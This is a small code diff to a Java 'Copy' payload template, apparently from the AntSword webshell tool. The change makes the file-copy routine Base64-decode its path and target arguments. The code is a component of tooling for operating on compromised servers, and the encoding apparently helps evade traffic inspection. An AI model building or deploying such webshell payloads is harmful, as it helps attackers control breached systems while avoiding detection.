@@ -9,8 +9,8 @@ import java.io.FileOutputStream;
 public class Copy extends Template {
     @Override
     public String run() throws Exception {
-        String z1 = getParam("antswordargpath");
-        String z2 = getParam("antswordargtarget");
+        String z1 = new String(this.Base64DecodeToByte("antswordargpath"), this.cs);
+        String z2 = new String(this.Base64DecodeToByte("antswordargtarget"), this.cs);
         return CopyFileOrDirCode(z1, z2);
 
     }
